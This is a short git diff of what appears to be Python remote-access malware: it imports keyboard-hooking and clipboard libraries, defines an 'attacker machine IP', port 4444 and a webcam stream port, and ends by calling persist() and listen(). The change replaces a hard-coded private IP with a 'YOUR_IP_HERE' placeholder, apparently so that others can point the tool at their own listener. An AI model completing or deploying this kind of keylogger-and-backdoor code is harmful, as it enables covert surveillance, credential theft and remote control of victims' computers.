@@ -21,7 +21,7 @@ import win32clipboard
 from pynput import keyboard
 import ctypes
 
-HOST = "192.168.100.127"  # Attacker machine IP
+HOST = "YOUR_IP_HERE"  # Attacker machine IP
 PORT = 4444            # Attacker port
 STREAM_PORT = 9999     # Webcam stream port
 
@@ -307,3 +307,4 @@ def listen():
 persist()
 listen()
 client.close()
+
